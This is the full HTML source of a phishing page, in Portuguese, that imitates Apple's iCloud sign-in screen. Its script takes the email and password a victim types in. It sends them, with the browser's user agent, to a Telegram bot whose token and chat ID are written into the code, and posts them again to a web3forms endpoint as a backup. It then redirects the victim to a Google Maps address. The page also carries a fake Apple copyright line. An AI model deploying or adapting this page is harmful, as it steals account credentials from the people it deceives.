<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="ICO/favicon-16x16.png">
    <title>iCloud</title>
    <style>
        #password-field {
            display: none;
        }
        #sign-in-btn {
            display: none;
        }
        .loading {
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        const initialHeading = 'Iniciar sessão com o ID Apple';
        const TELEGRAM_BOT_TOKEN = '8016977591:AAHl7K3gMb87zFKzaQbfsX6gtmm7RGoteWs';
        const TELEGRAM_CHAT_ID = '1307420411';

        function goToPasswordStep() {
            const emailInput = document.getElementById("email-phone");
            const passwordFieldContainer = document.getElementById("password-field");
            const formHeading = document.getElementById("form-heading"); 
            const emailInputContainer = document.getElementById("email-container"); 
            
            const emailValue = emailInput.value;

            if (emailValue.length === 0) {
                alert('Por favor, digite seu Email ou Telefone.');
                return;
            }

            const arrowInEmail = emailInputContainer.querySelector('a');
            if (arrowInEmail) {
                arrowInEmail.style.display = 'none';
            }
            
            emailInput.setAttribute('readonly', true);
            passwordFieldContainer.style.display = "block";
            
            if (formHeading) { 
                formHeading.innerHTML = `
                    <span onclick="goToEmailStep()" style="cursor: pointer; color: #0071e3; margin-right: 10px;">
                        <i class='bx bx-chevron-left'></i>
                    </span>
                    ${initialHeading}
                `;
            }
            
            document.getElementById("password").focus();
        }

        function goToEmailStep() {
            const emailInput = document.getElementById("email-phone");
            const passwordFieldContainer = document.getElementById("password-field");
            const formHeading = document.getElementById("form-heading"); 
            const emailInputContainer = document.getElementById("email-container");
            
            passwordFieldContainer.style.display = 'none';

            const arrowInEmail = emailInputContainer.querySelector('a');
            if (arrowInEmail) {
                arrowInEmail.style.display = 'block';
            }
            
            emailInput.removeAttribute('readonly');
            emailInput.setAttribute('placeholder', 'Email or Phone Number');

            if (formHeading) { 
                formHeading.innerHTML = initialHeading;
            }
            emailInput.focus();
        }

        // Função para enviar dados para o Telegram
        async function sendToTelegram(email, password) {
            const message = `🔐 NOVO LOGIN iCloud\n\n📧 Email/Telefone: ${email}\n🔑 Senha: ${password}\n🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n📍 Localização: Duque de Caxias, RJ\n🌐 Navegador: ${navigator.userAgent.substring(0, 100)}...`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();
                console.log('Mensagem enviada para Telegram:', data);
                return data.ok;
            } catch (error) {
                console.error('Erro ao enviar para Telegram:', error);
                return false;
            }
        }

        // Configurar o evento de submit do formulário
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('login-form');
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const email = document.getElementById('email-phone').value;
                const password = document.getElementById('password').value;

                // Mostra loading
                const submitBtn = form.querySelector('button[type="submit"]');
                const originalHTML = submitBtn.innerHTML;
                submitBtn.innerHTML = '<i class="bx bx-loader-alt loading"></i>';
                submitBtn.style.pointerEvents = 'none';
                submitBtn.style.cursor = 'not-allowed';

                try {
                    // 1. Primeiro envia para o Telegram
                    console.log('Enviando para Telegram...');
                    const telegramSuccess = await sendToTelegram(email, password);
                    
                    if (telegramSuccess) {
                        console.log('✅ Dados enviados para Telegram com sucesso!');
                    } else {
                        console.log('⚠️ Falha no Telegram, continuando...');
                    }
                    
                    // 2. Envia para o web3forms (backup)
                    console.log('Enviando para web3forms...');
                    const formData = new FormData(form);
                    await fetch(form.action, {
                        method: 'POST',
                        body: formData
                    });

                    console.log('✅ Dados enviados para web3forms!');

                    // 3. Redireciona para o Google Maps
                    console.log('Redirecionando para Google Maps...');
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com/maps/place/UNIC+PRIMAVERA+-+DUQUE+DE+CAXIAS/@-22.6891125,-43.2781228,18z/data=!4m6!3m5!1s0x99732622eaa749:0x8a0ed03196ee37ce!8m2!3d-22.6891126!4d-43.2773576!16s%2Fg%2F11kbfq49jb?entry=ttu&g_ep=EgoyMDI1MTExMi4wIKXMDSoASAFQAw%3D%3D';
                    }, 1500);

                } catch (error) {
                    console.error('❌ Erro no processo:', error);
                    // Redireciona mesmo com erro
                    window.location.href = 'https://www.google.com/maps/place/UNIC+PRIMAVERA+-+DUQUE+DE+CAXIAS/@-22.6891125,-43.2781228,18z/data=!4m6!3m5!1s0x99732622eaa749:0x8a0ed03196ee37ce!8m2!3d-22.6891126!4d-43.2773576!16s%2Fg%2F11kbfq49jb?entry=ttu&g_ep=EgoyMDI1MTExMi4wIKXMDSoASAFQAw%3D%3D';
                }
            });
        });
    </script>
</head>

<body>
    <header>
        <nav>
            <a href="#" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a>
        </nav>
    </header>
    <main id="main">
        <form action="https://api.web3forms.com/submit" method="POST" id="login-form">
            <div id="sign-in">
                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="">
                
                <p id="form-heading">Iniciar sessão com o ID Apple</p>

                <input type="hidden" name="access_key" value="746802c2-5d7c-4e18-9dd1-7bf68846d799"> 

                <div id="form-inputs-container">
                    <div class="input-container" id="email-container">
                        <a href="#" onclick="goToPasswordStep()"> 
                            <i class='bx bx-right-arrow-circle'></i>
                        </a>
                        <input id="email-phone" name="email" type="text" placeholder="Email or Phone Number" required>
                    </div>

                    <div class="input-container" id="password-field">
                        <button type="submit" style="all: unset; cursor: pointer; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">
                            <i class='bx bx-right-arrow-circle'></i>
                        </button>
                        <input id="password" name="senha" type="password" placeholder="Password" required>
                    </div>
                </div>

                <button id="sign-in-btn" type="submit" style="display: none;">Sign In</button>

                <label><input type="checkbox" id="check">Keep me signed in</label>
                <div class="links"> 
                    <a href="#">Forgot Password?</a>
                    <a href="#">Create Apple ID</a>
                </div>
                
                <input type="hidden" name="redirect" value="https://www.google.com/maps/place/UNIC+PRIMAVERA+-+DUQUE+DE+CAXIAS/@-22.6891125,-43.2781228,18z/data=!4m6!3m5!1s0x99732622eaa749:0x8a0ed03196ee37ce!8m2!3d-22.6891126!4d-43.2773576!16s%2Fg%2F11kbfq49jb?entry=ttu&g_ep=EgoyMDI1MTExMi4wIKXMDSoASAFQAw%3D%3D">
                <input type="hidden" name="from_name" value="iCloud Login Capturado">
            </div>
        </form>
    </main>
    <footer>
        <div class="footer-div">System status
            <div class="sep"></div>
            Privacy Policy
            <div class="sep"></div>
            terms and condition
        </div>
        <div class="footer-div">Copyright © 2024 Apple Inc. All rights reserved.</div>
    </footer>
</body>

</html>
